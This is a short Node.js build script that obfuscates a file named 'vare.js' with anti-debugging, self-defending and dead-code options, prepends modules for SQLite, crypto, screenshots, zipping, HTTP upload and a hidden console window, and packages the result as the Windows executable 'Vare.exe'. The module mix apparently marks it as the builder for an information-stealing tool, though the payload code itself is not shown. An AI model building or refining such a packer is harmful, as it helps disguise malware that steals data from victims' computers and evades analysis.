var JavaScriptObfuscator = require('javascript-obfuscator');
var fs = require('fs');
const { execSync } = require('child_process');


async function obfuscate(code) {
  console.log('[+] Obfuscation Started')
    var obfuscationResult = await JavaScriptObfuscator.obfuscate(code,{
        "compact": false,
        "controlFlowFlattening": true,
        "controlFlowFlatteningThreshold": 1,
        "deadCodeInjection": true,
        "deadCodeInjectionThreshold": 1,
        "debugProtection": true,
        "debugProtectionInterval": 5000,
        "disableConsoleOutput": true,
        "rotateStringArray": true,
        "selfDefending": true,
        target: "node"
      }
    ).getObfuscatedCode()
      var modules = `require("fs");
require("path");
require("crypto");
require('sqlite3');
require("vareapi");
require('axios');
require('os');
require('fs-extra')
require('form-data');
require('jszip');
require('screenshot-desktop');
require('child_process');   
require('node-hide-console-window');  
`

      fs.writeFileSync('vareobf.js', modules + obfuscationResult)
      build()

}

async function build() {
  console.log('[+] Build Starting')
  await execSync(`pkg . --targets node16-win-x64 -C Gzip --no-bytecode --output Vare.exe`)
  console.log('[+] Build Completed')
  fs.unlinkSync('./vareobf.js')
}

const maincode = fs.readFileSync('vare.js').toString();
obfuscate(maincode)
